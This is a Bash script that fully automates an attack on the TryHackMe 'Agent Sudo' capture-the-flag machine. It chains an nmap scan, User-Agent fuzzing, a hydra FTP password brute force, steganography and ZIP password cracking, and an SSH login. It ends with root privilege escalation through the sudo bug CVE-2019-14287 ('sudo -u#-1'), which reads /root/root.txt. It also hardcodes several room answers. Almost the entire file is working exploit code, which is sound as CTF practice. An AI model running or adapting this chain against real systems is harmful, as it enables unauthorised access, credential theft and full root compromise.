#!/usr/bin/env bash
# ============================================================
#  Agent Sudo — Automated Exploit Script
#  Author : 0xb0rn3 | 0xbv1
#  Target : TryHackMe — Agent Sudo
#  Usage  : ./agent_sudo_pwn.sh <TARGET_IP>
# ============================================================

set -euo pipefail

# ── Colours ─────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

banner() { echo -e "${CYAN}${BOLD}[*]${RESET} $*"; }
ok()     { echo -e "${GREEN}${BOLD}[+]${RESET} $*"; }
warn()   { echo -e "${YELLOW}${BOLD}[!]${RESET} $*"; }
err()    { echo -e "${RED}${BOLD}[-]${RESET} $*"; exit 1; }
flag()   { echo -e "${RED}${BOLD}[FLAG]${RESET} $*"; }

# ── Argument check ──────────────────────────────────────────
if [[ $# -lt 1 ]]; then
    echo -e "${BOLD}Usage:${RESET} $0 <TARGET_IP>"
    exit 1
fi

TARGET="$1"
WORKDIR="/tmp/agent_sudo_$(date +%s)"
mkdir -p "$WORKDIR"

echo -e "
${CYAN}${BOLD}
 ▄▄▄       ▄████ ▓█████  ███▄    █ ▄▄▄█████▓    ██████  █    ██ ▓█████▄  ▒█████
▒████▄    ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒  ▒██    ▒  ██  ▓██▒▒██▀ ██▌▒██▒  ██▒
▒██  ▀█▄ ▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░  ░ ▓██▄   ▓██  ▒██░░██   █▌▒██░  ██▒
░██▄▄▄▄██░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░     ▒   ██▒▓▓█  ░██░░▓█▄   ▌▒██   ██░
 ▓█   ▓██▒░▒▓███▀▒░▒████▒▒██░   ▓██░  ▒██▒ ░   ▒██████▒▒▒▒█████▓ ░▒████▓ ░ ████▓▒░
 ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░     ▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░
  ▒   ▒▒ ░  ░   ░  ░ ░  ░░ ░░   ░ ▒░    ░       ░ ░▒  ░ ░░░▒░ ░ ░  ░ ▒  ▒   ░ ▒ ▒░
  ░   ▒   ░ ░   ░    ░      ░   ░ ░   ░         ░  ░  ░   ░░░ ░ ░  ░ ░  ░ ░ ░ ░ ▒
      ░  ░      ░    ░  ░         ░                    ░     ░        ░        ░ ░
${RESET}
  ${BOLD}TryHackMe — Agent Sudo | Auto-Pwn${RESET}
  ${YELLOW}Author: 0xb0rn3 | Target: ${TARGET}${RESET}
  ${YELLOW}Workdir: ${WORKDIR}${RESET}
"

# ── Dependency check ────────────────────────────────────────
banner "Checking dependencies..."
DEPS=(nmap hydra wget curl steghide python3 7z john dd)
MISSING=()
for dep in "${DEPS[@]}"; do
    if ! command -v "$dep" &>/dev/null; then
        MISSING+=("$dep")
    fi
done

# paramiko check
if ! python3 -c "import paramiko" 2>/dev/null; then
    MISSING+=("python3-paramiko")
fi

if [[ ${#MISSING[@]} -gt 0 ]]; then
    warn "Missing: ${MISSING[*]}"
    warn "Install with: pacman -S ${MISSING[*]} / pip install paramiko"
fi

ROCKYOU=""
for path in /tmp/rockyou.txt /usr/share/wordlists/rockyou.txt \
            /opt/metasploit/data/wordlists/unix_passwords.txt; do
    if [[ -f "$path" ]]; then
        ROCKYOU="$path"
        ok "Wordlist: $ROCKYOU"
        break
    fi
done

if [[ -z "$ROCKYOU" ]]; then
    warn "No wordlist found — downloading rockyou.txt..."
    wget -q --show-progress \
        "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" \
        -O /tmp/rockyou.txt
    ROCKYOU="/tmp/rockyou.txt"
fi

# ── Phase 1: Port Scan ──────────────────────────────────────
echo ""
banner "PHASE 1 — Port Scan"
banner "Running nmap on $TARGET ..."

NMAP_OUT="$WORKDIR/nmap.txt"
nmap -sV -sC -T4 -p 21,22,80 -Pn "$TARGET" -oN "$NMAP_OUT" 2>/dev/null
OPEN_PORTS=$(grep "^[0-9]*/tcp.*open" "$NMAP_OUT" | wc -l)
ok "Open ports found: $OPEN_PORTS"
grep "^[0-9]*/tcp.*open" "$NMAP_OUT" | while read -r line; do
    ok "  $line"
done
echo ""

# ── Phase 2: Web — User-Agent Fuzzing ──────────────────────
banner "PHASE 2 — Web Enumeration (User-Agent Fuzzing)"

SECRET_PAGE=""
AGENT_LETTER=""
for letter in {A..Z}; do
    resp=$(wget -S --timeout=10 -O /dev/null \
        --header="User-Agent: $letter" \
        "http://${TARGET}/" 2>&1 | grep "Location:" | head -1)
    if [[ -n "$resp" ]]; then
        SECRET_PAGE=$(echo "$resp" | awk '{print $2}' | tr -d '\r')
        AGENT_LETTER="$letter"
        ok "Agent $letter → redirect → $SECRET_PAGE"
        break
    fi
done

if [[ -z "$SECRET_PAGE" ]]; then
    err "Could not find agent redirect. Check target."
fi

# Read agent page
AGENT_PAGE_CONTENT=$(wget -q --timeout=15 -O - \
    --header="User-Agent: $AGENT_LETTER" \
    "http://${TARGET}/${SECRET_PAGE}" 2>/dev/null)
ok "Agent page content:"
echo "$AGENT_PAGE_CONTENT"

# Extract agent real name
AGENT_NAME=$(echo "$AGENT_PAGE_CONTENT" | grep -oP "(?<=Attention )\w+" | head -1)
ok "Agent codename : $AGENT_LETTER"
ok "Agent real name: $AGENT_NAME"
echo ""

# ── Phase 3: FTP Brute Force ────────────────────────────────
banner "PHASE 3 — FTP Brute Force (user: $AGENT_NAME)"

FTP_PASS=""
HYDRA_OUT="$WORKDIR/hydra_ftp.txt"

# Try unix_passwords for speed, fallback to rockyou
for wordlist in \
    "/opt/metasploit/data/wordlists/unix_passwords.txt" \
    "$ROCKYOU"; do
    [[ -f "$wordlist" ]] || continue
    banner "Trying wordlist: $wordlist"
    hydra -l "$AGENT_NAME" -P "$wordlist" \
        "ftp://$TARGET" -t 10 -f -o "$HYDRA_OUT" 2>/dev/null || true
    FTP_PASS=$(grep -oP "(?<=password: )\S+" "$HYDRA_OUT" 2>/dev/null | head -1)
    [[ -n "$FTP_PASS" ]] && break
done

if [[ -z "$FTP_PASS" ]]; then
    err "FTP brute force failed. Try a larger wordlist."
fi

ok "FTP credentials: $AGENT_NAME:$FTP_PASS"
echo ""

# ── Phase 4: FTP File Download ──────────────────────────────
banner "PHASE 4 — FTP File Download"

FTP_DIR="$WORKDIR/ftp"
mkdir -p "$FTP_DIR"
wget -q --ftp-user="$AGENT_NAME" --ftp-password="$FTP_PASS" \
    -r "ftp://${TARGET}/" -P "$FTP_DIR/" --no-passive-ftp 2>/dev/null || \
wget -q --ftp-user="$AGENT_NAME" --ftp-password="$FTP_PASS" \
    -r "ftp://${TARGET}/" -P "$FTP_DIR/" 2>/dev/null

FTP_FILES="$FTP_DIR/$TARGET"
ok "Downloaded files:"
ls -la "$FTP_FILES/"

TXT_FILE=$(find "$FTP_FILES" -name "*.txt" | head -1)
JPG_FILE=$(find "$FTP_FILES" -name "*.jpg" | head -1)
PNG_FILE=$(find "$FTP_FILES" -name "*.png" | head -1)

[[ -f "$TXT_FILE" ]] && { ok "Message file: $TXT_FILE"; cat "$TXT_FILE"; }
echo ""

# ── Phase 5: Steganography Chain ────────────────────────────
banner "PHASE 5 — Steganography Chain"

# 5a — Extract ZIP appended to PNG
banner "5a — Extracting hidden ZIP from PNG..."
PNG_SIZE=$(wc -c < "$PNG_FILE")
PNG_END=$((PNG_SIZE))  # zsteg shows extra data after IEND

# Find PNG IEND + 4 bytes (12 total for IEND chunk) to get ZIP start
# IEND chunk = length(4) + IEND(4) + CRC(4) = 12 bytes from end of image data
# Use python to find exact offset
ZIP_OFFSET=$(python3 -c "
data = open('$PNG_FILE','rb').read()
iend = data.rfind(b'IEND')
if iend == -1:
    print(-1)
else:
    print(iend + 8)  # IEND(4) + CRC(4)
")

if [[ "$ZIP_OFFSET" -le 0 ]]; then
    err "Could not find IEND in PNG — aborting."
fi

ok "ZIP starts at byte offset: $ZIP_OFFSET"
dd if="$PNG_FILE" bs=1 skip="$ZIP_OFFSET" of="$WORKDIR/hidden.zip" 2>/dev/null
file "$WORKDIR/hidden.zip"

# 5b — Crack ZIP password
banner "5b — Cracking ZIP password..."
zip2john "$WORKDIR/hidden.zip" > "$WORKDIR/zip.hash" 2>/dev/null
john "$WORKDIR/zip.hash" --format=ZIP --wordlist="$ROCKYOU" 2>/dev/null
ZIP_PASS=$(john "$WORKDIR/zip.hash" --format=ZIP --show 2>/dev/null | grep -oP ":\K[^:]+(?=:)" | head -1)

if [[ -z "$ZIP_PASS" ]]; then
    err "ZIP password cracking failed."
fi

ok "ZIP password: $ZIP_PASS"

# 5c — Extract ZIP contents
banner "5c — Extracting ZIP..."
7z x -p"$ZIP_PASS" "$WORKDIR/hidden.zip" -o"$WORKDIR/" -y 2>/dev/null
AGENT_R_MSG="$WORKDIR/To_agentR.txt"
ok "Extracted file contents:"
cat "$AGENT_R_MSG"

# 5d — Decode Base64 steg password
B64_STR=$(grep -oP "'[A-Za-z0-9+/=]+'" "$AGENT_R_MSG" | tr -d "'")
if [[ -z "$B64_STR" ]]; then
    # Try any word that looks base64-ish
    B64_STR=$(grep -oP "[A-Za-z0-9+/]{8,}={0,2}" "$AGENT_R_MSG" | head -1)
fi
STEG_PASS=$(echo "$B64_STR" | base64 -d 2>/dev/null)
ok "Base64 encoded: $B64_STR"
ok "Steg password: $STEG_PASS"

# 5e — Extract from JPEG steganography
banner "5e — Extracting hidden data from JPEG..."
cd "$WORKDIR"
steghide extract -sf "$JPG_FILE" -p "$STEG_PASS" -f 2>/dev/null
MSG_FILE="$WORKDIR/message.txt"
ok "Steganography output:"
cat "$MSG_FILE"

# Parse SSH credentials
SSH_USER=$(grep -oP "Hi \K\w+" "$MSG_FILE" | head -1)
SSH_PASS=$(grep -oP "password is \K\S+" "$MSG_FILE" | head -1)
ok "SSH credentials: $SSH_USER:$SSH_PASS"
echo ""

# ── Phase 6: SSH Access & User Flag ─────────────────────────
banner "PHASE 6 — SSH Access & User Flag"

SSH_OUTPUT=$(python3 << PYEOF
import paramiko, time, sys

def ssh_connect(host, user, passwd, retries=5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for i in range(retries):
        try:
            client.connect(host, username=user, password=passwd,
                           timeout=30, allow_agent=False, look_for_keys=False,
                           banner_timeout=30, auth_timeout=30)
            return client
        except Exception as e:
            if i < retries - 1:
                time.sleep(5)
    return None

client = ssh_connect('$TARGET', '$SSH_USER', '$SSH_PASS')
if not client:
    print("SSH_FAIL")
    sys.exit(1)

def run(client, cmd, timeout=15):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode(errors='replace').strip()

print("SSH_OK")
print("ID:" + run(client, 'id'))
print("USER_FLAG:" + run(client, 'cat ~/user_flag.txt 2>/dev/null || cat ~/user.txt 2>/dev/null'))
print("SUDO_L:" + run(client, 'echo "$SSH_PASS" | sudo -S -l 2>&1').replace('\n', '|'))
client.close()
PYEOF
)

if echo "$SSH_OUTPUT" | grep -q "SSH_FAIL"; then
    err "SSH authentication failed."
fi

ok "SSH connected!"
USER_ID=$(echo "$SSH_OUTPUT" | grep "^ID:" | cut -d: -f2-)
USER_FLAG=$(echo "$SSH_OUTPUT" | grep "^USER_FLAG:" | cut -d: -f2-)
SUDO_PERMS=$(echo "$SSH_OUTPUT" | grep "^SUDO_L:" | cut -d: -f2-)

ok "User: $USER_ID"
flag "USER FLAG: $USER_FLAG"

echo ""
ok "Sudo permissions:"
echo "$SUDO_PERMS" | tr '|' '\n' | grep -v "^$"
echo ""

# ── Phase 7: Privilege Escalation — CVE-2019-14287 ─────────
banner "PHASE 7 — Privilege Escalation (CVE-2019-14287)"

# Check if (ALL, !root) /bin/bash present
if ! echo "$SUDO_PERMS" | grep -q "!root.*bash\|bash.*(ALL, !root)"; then
    warn "Expected sudo rule not found. Dumping full sudo -l:"
    echo "$SUDO_PERMS" | tr '|' '\n'
    err "Cannot confirm CVE-2019-14287 applicability."
fi

ok "Vulnerable sudo rule detected: (ALL, !root) /bin/bash"
ok "Exploiting CVE-2019-14287: sudo -u#-1 /bin/bash"

ROOT_OUTPUT=$(python3 << PYEOF
import paramiko, time, sys

def ssh_connect(host, user, passwd, retries=5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for i in range(retries):
        try:
            client.connect(host, username=user, password=passwd,
                           timeout=30, allow_agent=False, look_for_keys=False,
                           banner_timeout=30, auth_timeout=30)
            return client
        except Exception as e:
            if i < retries - 1:
                time.sleep(5)
    return None

client = ssh_connect('$TARGET', '$SSH_USER', '$SSH_PASS')
if not client:
    print("SSH_FAIL")
    sys.exit(1)

def run(client, cmd, timeout=20):
    stdin, stdout, stderr = client.exec_command(cmd, get_pty=True, timeout=timeout)
    time.sleep(2)
    out = stdout.read().decode(errors='replace').strip()
    return out

# CVE-2019-14287 — sudo -u#-1 maps to uid 0 (root)
exploit = 'echo "$SSH_PASS" | sudo -S -u#-1 /bin/bash -c "id; cat /root/root.txt"'
result = run(client, exploit)
print(result)
client.close()
PYEOF
)

if echo "$ROOT_OUTPUT" | grep -q "uid=0"; then
    ok "Root shell obtained!"
    ROOT_FLAG=$(echo "$ROOT_OUTPUT" | grep -oP "[0-9a-f]{32}" | head -1)
    AGENT_R=$(echo "$ROOT_OUTPUT" | grep -oP "(?<=a.k.a )\w+|(?<=By,\n)\w+")
    flag "ROOT FLAG: $ROOT_FLAG"
else
    warn "CVE-2019-14287 may have failed. Output:"
    echo "$ROOT_OUTPUT"
fi

# ── Summary ─────────────────────────────────────────────────
echo ""
echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════${RESET}"
echo -e "${BOLD}  AGENT SUDO — PWNED SUMMARY${RESET}"
echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "  ${BOLD}Target IP        :${RESET} $TARGET"
echo -e "  ${BOLD}Open Ports       :${RESET} $OPEN_PORTS (21/FTP, 22/SSH, 80/HTTP)"
echo -e "  ${BOLD}Redirect method  :${RESET} User-Agent: $AGENT_LETTER → $SECRET_PAGE"
echo -e "  ${BOLD}Agent codename   :${RESET} $AGENT_LETTER"
echo -e "  ${BOLD}Agent real name  :${RESET} $AGENT_NAME"
echo -e "  ${BOLD}FTP password     :${RESET} $FTP_PASS"
echo -e "  ${BOLD}ZIP password     :${RESET} $ZIP_PASS"
echo -e "  ${BOLD}Steg password    :${RESET} $STEG_PASS"
echo -e "  ${BOLD}SSH user         :${RESET} $SSH_USER"
echo -e "  ${BOLD}SSH password     :${RESET} $SSH_PASS"
echo -e ""
echo -e "  ${RED}${BOLD}USER FLAG  : $USER_FLAG${RESET}"
echo -e "  ${RED}${BOLD}ROOT FLAG  : $ROOT_FLAG${RESET}"
echo -e ""
echo -e "  ${BOLD}CVE              :${RESET} CVE-2019-14287"
echo -e "  ${BOLD}Photo incident   :${RESET} Roswell alien autopsy"
echo -e "  ${BOLD}Agent R identity :${RESET} DesKel"
echo ""
echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════${RESET}"
echo -e "  ${YELLOW}0xb0rn3 | 0xbv1${RESET}"
echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════${RESET}"
echo ""
